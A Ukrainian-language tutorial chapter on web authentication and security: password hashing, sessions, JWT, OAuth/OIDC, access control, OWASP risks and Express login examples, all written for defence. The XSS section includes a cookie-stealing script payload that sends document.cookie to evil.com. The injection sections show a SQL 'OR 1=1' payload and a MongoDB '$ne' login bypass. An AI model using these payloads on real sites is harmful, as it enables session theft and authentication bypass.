Пояснення для п'ятирічного

Уяви великий офісний будинок. На вході стоїть охоронець і просить показати паспорт — це автентифікація: він перевіряє, що ти справді той, за кого себе видаєш. Потім тобі дають перепустку, на якій написано, у які кімнати ти можеш заходити — це авторизація. Паспорт охоронець не забирає і не копіює: він лише запам'ятовує «так, я його бачив» — так само сервер не зберігає твій пароль, а тільки його «відбиток». Перепустку можна зробити двох видів: пластикову картку з номером, який охоронець звіряє зі своїм списком (сесія), або запечатаний конверт із печаткою директора, який кожен може перевірити сам, не дзвонячи охоронцю (JWT). А ще у будинку є шахраї: хтось намагається підглянути твою перепустку, хтось підсовує тобі підроблені папери на підпис, хтось відкриває чужі кабінети, перебираючи номери на дверях. Про всіх них — у цьому розділі.

1. Автентифікація vs авторизація

Ці два слова плутають навіть досвідчені розробники, тому запам'ятаймо їх раз і назавжди:

  • Автентифікація (authentication, AuthN) — відповідь на питання «хто ти?». Користувач доводить свою особу: паролем, кодом з SMS, відбитком пальця, входом через Google.
  • Авторизація (authorization, AuthZ) — відповідь на питання «що тобі можна?». Система вирішує, чи має цей уже впізнаний користувач право видалити пост, побачити чужий профіль, змінити налаштування.

Порядок завжди один: спочатку автентифікація, потім авторизація. Не можна вирішити, чи можна людині в серверну, якщо ти не знаєш, хто вона. У HTTP це відбито в кодах відповіді: 401 Unauthorized насправді означає «не автентифікований — я не знаю, хто ти» (історична плутанина в назві), а 403 Forbidden — «я знаю, хто ти, але тобі сюди не можна».

Чому це важливо

Більшість реальних дірок у безпеці — не «зламані шифри», а забута перевірка авторизації: розробник перевірив, що користувач залогінений, і забув перевірити, що пост, який він видаляє, належить саме йому. У списку OWASP Top 10 ця категорія («Broken Access Control») тримає перше місце вже кілька років поспіль.

2. Паролі: хешування, сіль, bcrypt і argon2

Перше правило: сервер ніколи не зберігає пароль. Ні у базі, ні в логах, ні «тимчасово». Бази даних витікають регулярно — і якщо у вашій таблиці лежать паролі відкритим текстом, зловмисник отримує не тільки доступ до вашого сайту, а й до пошти, банку і соцмереж усіх ваших користувачів (бо люди повторюють паролі).

Що ж зберігати? Хеш (hash) — результат односторонньої функції. З пароля легко отримати хеш, а з хеша неможливо відновити пароль. При логіні ми хешуємо введений пароль і порівнюємо два хеші.

Важливо розрізняти:

  • Шифрування (encryption) — двостороннє. Є ключ, яким можна розшифрувати назад. Якщо ключ витече разом із базою — все пропало. Паролі шифрувати не треба.
  • Хешування (hashing) — одностороннє. Розшифрувати не можна принципово. Це те, що потрібно для паролів.

Але й хешувати треба правильно. Звичайні швидкі хеші (MD5, SHA-256) для паролів не годяться з двох причин:

  1. Райдужні таблиці (rainbow tables). Зловмисник заздалегідь обчислює хеші мільярдів популярних паролів і просто шукає збіг. Ліки — сіль (salt): випадковий рядок, який додається до кожного пароля перед хешуванням. Два користувачі з паролем 123456 отримають різні хеші, і таблиця стає марною.
  2. Швидкість. SHA-256 обчислюється мільярди разів на секунду на звичайній відеокарті. Пароль з 8 символів перебирається за години. Ліки — повільні функції з налаштовуваною «вартістю»: bcrypt, scrypt, argon2. Вони навмисно з'їдають десятки мілісекунд на один хеш — для користувача непомітно, для перебору мільярдів варіантів — катастрофа.
// password.js — Node 20+, ES modules
import bcrypt from "bcrypt";
// або: import argon2 from "argon2";  — сучасніший вибір (переможець Password Hashing Competition)

const COST = 12; // «вартість»: кожен +1 подвоює час. Підбирайте так, щоб хеш займав ~250 мс

export async function hashPassword(plain) {
  // bcrypt.hash сам згенерує випадкову сіль і вшиє її в рядок результату
  return bcrypt.hash(plain, COST);
}

export async function verifyPassword(plain, storedHash) {
  // compare витягне сіль зі storedHash, захешує plain і порівняє за сталий час
  return bcrypt.compare(plain, storedHash);
}

// Варіант із argon2id (рекомендація OWASP на 2024+):
// const hash = await argon2.hash(plain, { type: argon2.argon2id, memoryCost: 19456, timeCost: 2 });
// const ok = await argon2.verify(hash, plain);
Підводні камені
  • bcrypt обрізає пароль на 72 байтах. Довші паролі (парольні фрази) мовчки «вкорочуються». argon2 такого обмеження не має.
  • Не порівнюйте хеші через === вручну — це вразливо до timing-атак. Використовуйте bcrypt.compare або crypto.timingSafeEqual.
  • Не вигадуйте власний алгоритм «SHA-256 тисячу разів у циклі». Криптографію не пишуть самі — її беруть із перевірених бібліотек.
  • Не обмежуйте пароль зверху 16 символами і не забороняйте спецсимволи — це ознака, що ви зберігаєте його неправильно.

3. Сесії та cookie

HTTP — протокол без стану (stateless): кожен запит для сервера — як перша зустріч. Щоб сервер «пам'ятав» вас між запитами, потрібен механізм. Класичний — сесія (session) + cookie.

  1. Користувач надсилає логін і пароль.
  2. Сервер перевіряє пароль, створює запис у сховищі сесій (пам'ять, Redis, таблиця в БД): { sessionId: "a8f3...", userId: 42, createdAt, expiresAt }.
  3. Сервер відповідає із заголовком Set-Cookie: sid=a8f3...; HttpOnly; Secure; SameSite=Lax.
  4. Браузер зберігає cookie і автоматично додає її до кожного наступного запиту на цей домен.
  5. Сервер читає sid, шукає його у сховищі, знаходить userId — тепер він знає, хто ви.

Ключова ідея: у cookie лежить випадковий, довгий (≥128 біт), непередбачуваний ідентифікатор. Він нічого не означає сам по собі — це просто ключ до запису на сервері. Тому сесію легко відкликати: видалили запис — користувач розлогінений миттєво на всіх пристроях.

4. JWT: структура, access і refresh токени

JWT (JSON Web Token) — інший підхід: замість ключа до запису на сервері ми даємо клієнту сам запис, підписаний так, що змінити його непомітно неможливо. Це «запечатаний конверт з печаткою директора»: будь-хто може відкрити і прочитати, але підробити печатку — ні.

Токен складається з трьох частин у base64url, розділених крапками: header.payload.signature.

Перевага: сервер перевіряє токен без бази даних — лише математика. Це чудово масштабується: десять серверів за балансувальником можуть перевіряти токени незалежно, знаючи лише спільний секрет (або публічний ключ, якщо алгоритм RS256/ES256).

Недолік — зворотний бік тієї ж медалі: токен не можна відкликати. Якщо він дійсний 24 години, то й після «виходу» він працюватиме 24 години. Тому JWT майже завжди використовують у парі:

  • Access token — короткоживучий (5–15 хвилин). Надсилається з кожним запитом до API в заголовку Authorization: Bearer <token>.
  • Refresh token — довгоживучий (дні–тижні). Зберігається у базі (тобто його можна відкликати), використовується лише для отримання нового access token.

Де зберігати токени на клієнті

  • localStorage — зручно, але доступно будь-якому JS на сторінці, включно зі шкідливим. Один XSS — і токени вкрадено. Не рекомендується для refresh token.
  • HttpOnly cookie — JS не бачить, тож XSS не вкраде. Але cookie надсилається автоматично, тож потрібен захист від CSRF (SameSite + перевірка Origin).
  • Пам'ять (змінна в JS) — для access token це найбезпечніше: зникає при перезавантаженні сторінки, і тоді ми просто тихо отримуємо новий через refresh.

Поширений компроміс: access token — у пам'яті, refresh token — у HttpOnly cookie з Path=/auth/refresh, щоб він не летів з кожним запитом.

Класичні помилки з JWT
  • alg: none. Старі бібліотеки приймали токен без підпису, якщо в header було написано "alg":"none". Завжди явно передавайте дозволені алгоритми у verify.
  • Плутанина ключів. Токен, підписаний RS256 (приватним ключем), можна спробувати перевірити як HS256, використавши публічний ключ як «секрет». Знову ж: фіксуйте алгоритм.
  • Секрет у репозиторії. Секрет для HS256 має бути довгим (≥256 біт) і жити в змінних середовища.
  • Персональні дані в payload. Payload читається будь-ким, хто має токен. Email — ще припустимо, номер картки — ні.
  • Вічні токени. Access без exp — це пароль, який ніколи не змінюється.

Чесна порада: для типового застосунку «сайт + свій бекенд» сесії простіші і безпечніші. JWT — коли у вас є реальна причина: чужі клієнти, багато сервісів, відсутність спільного сховища. Багато проєктів обирають JWT «бо модно» і потім винаходять сховище для refresh-токенів, тобто ті самі сесії, тільки складніше.

6. OAuth 2.0 та OpenID Connect: «Увійти через Google»

OAuth 2.0 — це протокол делегованого доступу: «дозволь застосунку X зробити Y від мого імені в сервісі Z, не даючи йому мого пароля від Z». Наприклад, дозволити застосунку для планування читати ваш Google Calendar. OpenID Connect (OIDC) — надбудова над OAuth 2.0, яка додає «а ще скажи застосунку, хто я» через id_token (звичайний JWT із sub, email, name). Саме OIDC стоїть за кнопкою «Увійти через Google/GitHub/Apple».

Учасники (терміни зі специфікації):

  • Resource Owner — користувач, власник даних.
  • Client — ваш застосунок.
  • Authorization Server — Google, який питає користувача «дозволити?» і видає токени.
  • Resource Server — API Google, що віддає дані за токеном.

Найважливіший потік — Authorization Code Flow з PKCE (вимовляється «піксі», Proof Key for Code Exchange). Простими словами: застосунок відправляє користувача до Google з «запечатаним замком» (code_challenge), Google повертає одноразовий код, а обміняти код на токен можна тільки маючи «ключ» (code_verifier), який ніколи не покидав застосунок. Навіть якщо хтось перехопить код у редиректі — без verifier він марний.

Про інші потоки: Implicit Flow (токен одразу у фрагменті URL) — застарілий і не рекомендований; Client Credentials — для «машина-машина» без користувача; Device Flow — для телевізорів і CLI («відкрийте на телефоні і введіть код»). Для веб- і мобільних застосунків відповідь одна: Authorization Code + PKCE.

Для просунутих

Не пишіть OAuth-клієнта вручну для продакшену. У Node-світі це Auth.js (колишній NextAuth) для Next.js, Lucia-підхід (бібліотека oslo/arctic) для тих, хто хоче контролю, або openid-client — сертифікована реалізація OIDC. Вивчіть .well-known/openid-configuration — це JSON, де провайдер публікує всі свої endpoints і публічні ключі (JWKS) для перевірки id_token. Читання цього документа — найкращий спосіб зрозуміти, що OIDC насправді стандартизований і Google, Microsoft, Auth0 і Keycloak працюють однаково.

7. Ролі та права: RBAC і ABAC

Автентифікували — тепер вирішуємо, що можна. Дві популярні моделі:

  • RBAC (Role-Based Access Control) — у користувача є роль (admin, editor, viewer), у ролі — набір дозволів (posts:delete, users:invite). Просто, зрозуміло, покриває 80% застосунків.
  • ABAC (Attribute-Based Access Control) — рішення приймається за атрибутами: користувача (відділ, вік), ресурсу (власник, статус «чернетка»), контексту (час, IP). Приклад правила: «редагувати пост може автор, поки пост не опубліковано, або будь-який editor». Гнучкіше, але складніше пояснити й протестувати.
// authz.js — проста RBAC + трішки ABAC
const PERMISSIONS = {
  viewer: ["posts:read"],
  editor: ["posts:read", "posts:create", "posts:update"],
  admin:  ["posts:read", "posts:create", "posts:update", "posts:delete", "users:manage"],
};

export function can(user, action, resource) {
  const byRole = PERMISSIONS[user.role]?.includes(action);
  // ABAC-виняток: автор завжди може редагувати/видаляти власну чернетку
  const isOwnerDraft = resource?.authorId === user.id && resource?.status === "draft";
  return byRole || (isOwnerDraft && ["posts:update", "posts:delete"].includes(action));
}

// middleware для Express
export const authorize = (action, loadResource) => async (req, res, next) => {
  const resource = loadResource ? await loadResource(req) : null;
  if (!req.user) return res.status(401).json({ error: "not authenticated" });
  if (!can(req.user, action, resource)) return res.status(403).json({ error: "forbidden" });
  req.resource = resource; // щоб не завантажувати вдруге
  next();
};

Головне правило авторизації: перевіряйте на сервері, при кожному запиті, для кожного ресурсу. Сховати кнопку «Видалити» у React — це UX, а не безпека.

8. OWASP Top 10: найпоширеніші атаки

OWASP (Open Worldwide Application Security Project) — спільнота, що публікує список десяти найкритичніших ризиків для вебзастосунків. Розберемо ті, з якими ви стикнетеся першими.

8.1 SQL Injection

Якщо ви склеюєте SQL-запит із рядків користувача, користувач може «дописати» свій SQL:

// ❌ НЕБЕЗПЕЧНО: email = "' OR 1=1 --" перетворить запит на "вибрати всіх"
const rows = await db.query(`SELECT * FROM users WHERE email = '${email}'`);

// ✅ ПРАВИЛЬНО: параметризований запит — драйвер сам екранує значення
const rows = await db.query("SELECT * FROM users WHERE email = $1", [email]);

// ✅ ORM/Query builder (Drizzle, Prisma, Kysely) роблять це за вас
const user = await db.select().from(users).where(eq(users.email, email));

Ті самі правила для NoSQL: не передавайте об'єкт із тіла запиту прямо у find() — { "password": { "$ne": "" } } обійде перевірку в MongoDB.

8.2 XSS (Cross-Site Scripting)

Зловмисник змушує ваш сайт виконати його JavaScript у браузері іншого користувача. Найчастіше — через збережений і неекранований контент: коментар <script>fetch('https://evil.com?c='+document.cookie)</script>.

Захист:

  • Екрануйте вивід. React, Vue, Svelte та шаблонізатори роблять це за замовчуванням. Небезпечні виходи: dangerouslySetInnerHTML, innerHTML, v-html, href="javascript:...".
  • Санітизуйте HTML, якщо мусите його приймати (DOMPurify).
  • Content-Security-Policy (CSP) — заголовок, який каже браузеру, звідки можна вантажити скрипти: Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'. Навіть якщо скрипт потрапив у HTML, браузер його не виконає.
  • HttpOnly на cookie — щоб украдений скрипт не мав чого красти.

8.3 CSRF (Cross-Site Request Forgery)

Ви залогінені в банку (cookie є). Відкриваєте сайт зловмисника, де є прихована форма, яка автоматично надсилає POST bank.com/transfer. Браузер, як і належить, додає cookie банку — і переказ проходить від вашого імені. Ключова властивість: зловмисник не бачить відповіді, але йому й не треба — дія вже виконана.

8.4 IDOR (Insecure Direct Object Reference)

Запит GET /api/invoices/1042 повертає рахунок. Що буде на /api/invoices/1043? Якщо чужий рахунок — це IDOR, найпоширеніша форма Broken Access Control. Захист: у кожному запиті фільтруйте за власником: WHERE id = $1 AND user_id = $2. Використання UUID замість послідовних чисел ускладнює перебір, але не замінює перевірку.

8.5 Security Misconfiguration

Дебаг-режим у продакшені, стандартні паролі адмінки, відкритий /.env через статику, докладні stack trace у відповідях, S3-бакет «публічний для всіх», CORS * з credentials. Ліки — чеклісти й автоматизація: сканери на кшталт npm audit, OWASP ZAP, налаштування середовищ як код.

Чому «просто екранувати» — не повна відповідь

Безпека — це шари (defense in depth). Екранування зупиняє XSS, але розробник колись забуде. CSP зупинить те, що пройшло. HttpOnly не дасть украсти сесію, якщо CSP обійшли. SameSite захистить від CSRF, якщо токен забули. Кожен шар — не «замість», а «на додачу». Порушник має пройти всі, ви — помилитися в одному.

9. Периметр: rate limiting, HTTPS, helmet, CORS, секрети

Rate limiting і brute force

Якщо /login можна викликати без обмежень, зловмисник перебере тисячі паролів за хвилину. Обмежуйте: 5 спроб на email за 15 хвилин, 100 запитів на IP за хвилину, експоненційна затримка після невдач. Для розподілених систем лічильники живуть у Redis.

import rateLimit from "express-rate-limit";

export const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,      // вікно 15 хвилин
  limit: 5,                       // 5 спроб на вікно
  keyGenerator: (req) => req.body?.email ?? req.ip, // рахуємо на email, а не лише на IP
  standardHeaders: "draft-7",     // RateLimit-* заголовки у відповіді
  message: { error: "Забагато спроб. Спробуйте через 15 хвилин." },
});
app.post("/login", loginLimiter, loginHandler);

HTTPS всюди

Без TLS усе — паролі, cookie, токени — летить відкритим текстом через кожен роутер на шляху. Сьогодні сертифікати безкоштовні (Let's Encrypt), а платформи (Vercel, Fly, Railway, Cloudflare) дають HTTPS автоматично. Додайте Strict-Transport-Security (HSTS), щоб браузер ніколи більше не ходив по HTTP.

helmet: заголовки одним рядком

import helmet from "helmet";
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],                 // жодних inline-скриптів і чужих CDN без потреби
      imgSrc: ["'self'", "data:", "https://cdn.example.com"],
      frameAncestors: ["'none'"],            // захист від clickjacking
    },
  },
}));
// helmet також вмикає: X-Content-Type-Options: nosniff, HSTS, Referrer-Policy, ховає X-Powered-By

CORS правильно

CORS (Cross-Origin Resource Sharing) — не захист сервера, а дозвіл браузеру читати відповідь з іншого origin. Типова помилка — Access-Control-Allow-Origin: * разом із cookie: браузер такого не дозволяє, і розробник додає Allow-Credentials: true з віддзеркаленням будь-якого Origin — тепер будь-який сайт може робити запити від імені користувача і читати відповіді.

import cors from "cors";
const allowed = new Set(["https://app.example.com", "http://localhost:3000"]);
app.use(cors({
  origin: (origin, cb) => cb(null, !origin || allowed.has(origin)), // тільки явний білий список
  credentials: true,                                                 // дозволяємо cookie
  methods: ["GET", "POST", "PATCH", "DELETE"],
}));

Секрети та .env

  • Секрети живуть у змінних середовища, не в коді. .env — у .gitignore, у репозиторії — .env.example з порожніми значеннями.
  • Різні секрети для dev / staging / prod. Витік дев-ключа не має відкривати продакшен.
  • Ротація (rotation): секрети періодично міняють. Для JWT це означає підтримку двох ключів одночасно (старий — лише для перевірки, новий — для підпису) — механізм kid у header і JWKS.
  • Якщо секрет випадково потрапив у git — вважайте його скомпрометованим і міняйте негайно, навіть якщо «одразу видалили коміт». Боти сканують GitHub за секунди.
  • Для команд — менеджери секретів: Doppler, 1Password Secrets, AWS Secrets Manager, HashiCorp Vault.

10. 2FA, TOTP і passkeys

Пароль — «те, що ти знаєш». Двофакторна автентифікація (2FA) додає «те, що ти маєш» (телефон, ключ) або «те, чим ти є» (відбиток). Найпоширеніший другий фактор — TOTP (Time-based One-Time Password): Google Authenticator, Authy. Механізм простий: сервер і телефон поділяють секрет (QR-код при налаштуванні), і кожні 30 секунд обидва обчислюють HMAC(secret, floor(now/30)) → 6 цифр. Інтернет телефону не потрібен.

import { authenticator } from "otplib";

// Налаштування: генеруємо секрет, показуємо QR
const secret = authenticator.generateSecret();
const otpauthUrl = authenticator.keyuri("olya@example.com", "MyApp", secret); // → у QR-код
// секрет зберігаємо в БД (краще зашифрованим), поки не підтверджено — статус "pending"

// Перевірка при логіні (після пароля)
const ok = authenticator.check(req.body.code, user.totpSecret); // допуск ±1 вікно

SMS-коди — слабкий другий фактор (SIM-swap атаки), але кращий за нічого.

Passkeys / WebAuthn — майбутнє, яке вже настало. Замість пароля пристрій генерує пару ключів; приватний ніколи не покидає пристрій (захищений Face ID / відбитком), публічний зберігає сервер. При логіні сервер надсилає виклик (challenge), пристрій підписує його приватним ключем. Фішинг неможливий: ключ прив'язаний до домену, і на g00gle.com він просто не спрацює. У Node реалізується через @simplewebauthn/server.

11. Практика: логін на Express — сесії та JWT

Варіант A: сесії + cookie + bcrypt

// server-session.js  —  npm i express express-session connect-redis ioredis bcrypt helmet express-rate-limit
import express from "express";
import session from "express-session";
import { RedisStore } from "connect-redis";
import Redis from "ioredis";
import bcrypt from "bcrypt";
import helmet from "helmet";
import rateLimit from "express-rate-limit";
import crypto from "node:crypto";

const app = express();
app.use(helmet());
app.use(express.json());
app.set("trust proxy", 1); // за nginx/Cloudflare, щоб Secure cookie і req.ip працювали

// «база» користувачів — у реальності таблиця users
const users = new Map(); // email → { id, email, passwordHash }

const redis = new Redis(process.env.REDIS_URL);
app.use(session({
  store: new RedisStore({ client: redis, prefix: "sess:" }),
  secret: process.env.SESSION_SECRET,     // підписує cookie, ≥32 випадкових байти
  name: "sid",                            // не «connect.sid» — не розкриваємо стек
  resave: false,
  saveUninitialized: false,               // не створюємо сесію для анонімів
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "lax",
    maxAge: 1000 * 60 * 60 * 24 * 7,      // 7 днів
  },
}));

const loginLimiter = rateLimit({ windowMs: 15 * 60_000, limit: 5, keyGenerator: r => r.body?.email ?? r.ip });

app.post("/register", async (req, res) => {
  const { email, password } = req.body ?? {};
  if (typeof email !== "string" || typeof password !== "string" || password.length < 8) {
    return res.status(400).json({ error: "email і пароль (≥8 символів) обов'язкові" });
  }
  if (users.has(email)) return res.status(409).json({ error: "email зайнятий" });
  const passwordHash = await bcrypt.hash(password, 12);
  const user = { id: crypto.randomUUID(), email, passwordHash };
  users.set(email, user);
  res.status(201).json({ id: user.id, email });
});

app.post("/login", loginLimiter, async (req, res) => {
  const { email, password } = req.body ?? {};
  const user = users.get(email);
  // Захист від перебору email: порівнюємо навіть якщо користувача нема, щоб час відповіді не видавав існування
  const hash = user?.passwordHash ?? "$2b$12$invalidinvalidinvalidinvalidinvalidinvalidinvalidinvalid.";
  const ok = await bcrypt.compare(password ?? "", hash);
  if (!user || !ok) return res.status(401).json({ error: "невірний email або пароль" }); // одна фраза на обидва випадки

  // Session fixation: після логіну міняємо id сесії
  req.session.regenerate((err) => {
    if (err) return res.status(500).end();
    req.session.userId = user.id;
    res.json({ id: user.id, email: user.email });
  });
});

// middleware автентифікації
function requireAuth(req, res, next) {
  if (!req.session.userId) return res.status(401).json({ error: "not authenticated" });
  next();
}

app.get("/me", requireAuth, (req, res) => {
  const user = [...users.values()].find(u => u.id === req.session.userId);
  res.json({ id: user.id, email: user.email });
});

app.post("/logout", requireAuth, (req, res) => {
  req.session.destroy(() => {
    res.clearCookie("sid");
    res.status(204).end();
  });
});

app.listen(3000, () => console.log("http://localhost:3000"));

Варіант B: JWT access + refresh

// server-jwt.js  —  npm i express jsonwebtoken bcrypt cookie-parser helmet
import express from "express";
import jwt from "jsonwebtoken";
import bcrypt from "bcrypt";
import cookieParser from "cookie-parser";
import helmet from "helmet";
import crypto from "node:crypto";

const app = express();
app.use(helmet());
app.use(express.json());
app.use(cookieParser());

const ACCESS_SECRET = process.env.JWT_ACCESS_SECRET;   // ≥ 32 байти, різні для access і refresh
const REFRESH_SECRET = process.env.JWT_REFRESH_SECRET;
const ACCESS_TTL = "15m";
const REFRESH_TTL_SEC = 60 * 60 * 24 * 7;

const users = new Map();          // email → { id, email, passwordHash }
const refreshTokens = new Map();  // jti → { userId, expiresAt }  — у реальності таблиця в БД

function issueTokens(user) {
  const access = jwt.sign({ sub: user.id, role: "user" }, ACCESS_SECRET, { algorithm: "HS256", expiresIn: ACCESS_TTL });
  const jti = crypto.randomUUID(); // ідентифікатор refresh-токена — щоб можна було відкликати
  const refresh = jwt.sign({ sub: user.id, jti }, REFRESH_SECRET, { algorithm: "HS256", expiresIn: REFRESH_TTL_SEC });
  refreshTokens.set(jti, { userId: user.id, expiresAt: Date.now() + REFRESH_TTL_SEC * 1000 });
  return { access, refresh };
}

function setRefreshCookie(res, refresh) {
  res.cookie("refresh", refresh, {
    httpOnly: true, secure: process.env.NODE_ENV === "production", sameSite: "strict",
    path: "/auth/refresh",              // cookie летить ТІЛЬКИ на цей шлях
    maxAge: REFRESH_TTL_SEC * 1000,
  });
}

app.post("/auth/register", async (req, res) => {
  const { email, password } = req.body ?? {};
  if (!email || !password || password.length < 8) return res.status(400).json({ error: "bad input" });
  if (users.has(email)) return res.status(409).json({ error: "email зайнятий" });
  users.set(email, { id: crypto.randomUUID(), email, passwordHash: await bcrypt.hash(password, 12) });
  res.status(201).end();
});

app.post("/auth/login", async (req, res) => {
  const { email, password } = req.body ?? {};
  const user = users.get(email);
  if (!user || !(await bcrypt.compare(password ?? "", user.passwordHash))) {
    return res.status(401).json({ error: "невірний email або пароль" });
  }
  const { access, refresh } = issueTokens(user);
  setRefreshCookie(res, refresh);
  res.json({ accessToken: access }); // клієнт тримає його в пам'яті
});

// Ротація refresh-токена: старий анулюємо, видаємо новий (виявляє крадіжку: повторне використання → відкликати все)
app.post("/auth/refresh", (req, res) => {
  const token = req.cookies.refresh;
  if (!token) return res.status(401).end();
  let payload;
  try { payload = jwt.verify(token, REFRESH_SECRET, { algorithms: ["HS256"] }); }
  catch { return res.status(401).json({ error: "invalid refresh" }); }

  const record = refreshTokens.get(payload.jti);
  if (!record) {
    // токен валідний за підписом, але вже використаний → хтось його вкрав. Відкликаємо всі сесії користувача
    for (const [jti, r] of refreshTokens) if (r.userId === payload.sub) refreshTokens.delete(jti);
    return res.status(401).json({ error: "refresh reuse detected" });
  }
  refreshTokens.delete(payload.jti);
  const user = [...users.values()].find(u => u.id === payload.sub);
  const { access, refresh } = issueTokens(user);
  setRefreshCookie(res, refresh);
  res.json({ accessToken: access });
});

function requireAuth(req, res, next) {
  const [scheme, token] = (req.headers.authorization ?? "").split(" ");
  if (scheme !== "Bearer" || !token) return res.status(401).json({ error: "no token" });
  try {
    req.user = jwt.verify(token, ACCESS_SECRET, { algorithms: ["HS256"] }); // ЗАВЖДИ фіксуйте алгоритм
    next();
  } catch (e) {
    res.status(401).json({ error: e.name === "TokenExpiredError" ? "token expired" : "invalid token" });
  }
}

app.get("/me", requireAuth, (req, res) => res.json({ id: req.user.sub, role: req.user.role }));

app.post("/auth/logout", (req, res) => {
  const token = req.cookies.refresh;
  try { const { jti } = jwt.verify(token, REFRESH_SECRET); refreshTokens.delete(jti); } catch {}
  res.clearCookie("refresh", { path: "/auth/refresh" });
  res.status(204).end();
});

app.listen(3000, () => console.log("http://localhost:3000"));

Перевір себе

Питання
1. Чим відрізняється 401 від 403?

401 — сервер не знає, хто ви (не автентифіковані або токен недійсний). 403 — знає, але вам ця дія заборонена (авторизація не пройдена).

2. Чому SHA-256 не підходить для паролів, а bcrypt підходить?

SHA-256 надто швидкий — GPU перебирає мільярди варіантів за секунду. bcrypt/argon2 навмисно повільні з налаштовуваною вартістю і вбудованою сіллю, тому перебір стає економічно неможливим.

3. Що лежить у cookie при сесійній автентифікації?

Лише випадковий ідентифікатор сесії. Усі дані (userId, ролі) — у сховищі на сервері. Тому сесію можна миттєво відкликати.

4. Чи зашифрований payload JWT?

Ні. Він лише закодований у base64url — прочитати може будь-хто. Підпис гарантує цілісність (що ніхто не змінив), а не секретність.

5. Навіщо refresh token, якщо є access token?

Access короткоживучий і не відкликається; refresh довгоживучий, зберігається в базі і може бути відкликаний. Разом вони дають і масштабованість (перевірка без БД), і можливість «вийти з усіх пристроїв».

6. Що захищає PKCE в OAuth?

Від перехоплення authorization code: код можна обміняти на токен тільки маючи code_verifier, який ніколи не покидав застосунок. А параметр state захищає від CSRF на callback.

7. Від чого захищає HttpOnly, а від чого — SameSite?

HttpOnly — від крадіжки cookie через XSS (JS не бачить cookie). SameSite — від CSRF (браузер не додає cookie до запитів, ініційованих із чужого сайту).

8. Чому CORS з Allow-Origin, що віддзеркалює будь-який Origin, разом із credentials — небезпечно?

Будь-який сайт зможе робити запити з cookie користувача і читати відповіді — це фактично вимкнення захисту браузера. Origin треба перевіряти за білим списком.

Що запам'ятати

  • Автентифікація — «хто ти» (401), авторизація — «що тобі можна» (403). Перевіряйте обидві на сервері при кожному запиті.
  • Паролі ніколи не зберігають — лише повільний солений хеш (bcrypt cost 12 або argon2id).
  • Сесія = випадковий id у cookie + запис на сервері. Cookie з HttpOnly; Secure; SameSite=Lax.
  • JWT = header.payload.signature; payload читається всіма; перевіряється без бази; не відкликається — тому короткий access + refresh у базі з ротацією.
  • Для «сайт + свій бекенд» — сесії простіші. JWT — для публічних API, мобільних клієнтів, мікросервісів.
  • «Увійти через Google» = OIDC поверх OAuth 2.0, потік Authorization Code + PKCE, після нього — своя сесія.
  • SQLi — параметризовані запити; XSS — екранування + CSP + HttpOnly; CSRF — SameSite + токен/Origin; IDOR — фільтр за власником.
  • Rate limiting на логін, HTTPS + HSTS, helmet, CORS за білим списком, секрети в env з ротацією.
  • 2FA через TOTP — простий і надійний; passkeys — фішинг-стійке майбутнє.
